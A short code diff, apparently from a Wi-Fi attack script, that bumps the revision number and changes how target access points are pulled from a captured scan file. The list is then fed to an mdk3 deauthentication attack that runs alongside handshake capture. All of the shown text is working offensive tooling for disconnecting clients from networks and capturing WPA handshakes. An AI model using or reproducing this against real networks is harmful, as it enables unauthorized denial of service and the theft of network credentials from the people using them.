@@ -29,7 +29,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=72
+revision=73
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -4369,7 +4369,7 @@ function attack {
 
 	killall aireplay-ng &> $flux_output_device
 	killall mdk3 &> $flux_output_device
-	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
+	strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1 | awk '{if (NR!=1) {print}}' >$DUMP_PATH/mdk3.txt
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 
 	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
